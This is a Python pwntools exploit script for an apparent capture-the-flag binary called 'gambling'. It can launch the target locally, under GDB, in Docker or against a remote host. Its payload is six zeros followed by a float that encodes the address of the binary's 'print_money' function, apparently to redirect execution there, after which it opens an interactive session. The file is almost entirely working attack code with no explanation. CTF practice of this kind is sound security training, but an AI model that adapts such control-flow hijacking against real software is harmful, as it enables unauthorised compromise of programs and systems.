#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('gambling')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def hex_to_double(addr):
    return struct.unpack('<d', p64(addr))[0]


def double_to_hex(val: float) -> str:
    packed = struct.pack('<d', val)
    bits = struct.unpack('<Q', packed)[0]
    return hex(bits)


def pad_to_qword(n: int, total_bytes: int = 8) -> int:
    length = (n.bit_length() + 7) // 8 or 1
    return n << ((total_bytes - length) * 8)


def solve():

    payload = f"0 0 0 0 0 0 {hex_to_double(pad_to_qword(exe.sym["print_money"]))}"
    print(payload)

    io.sendline(payload.encode())

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

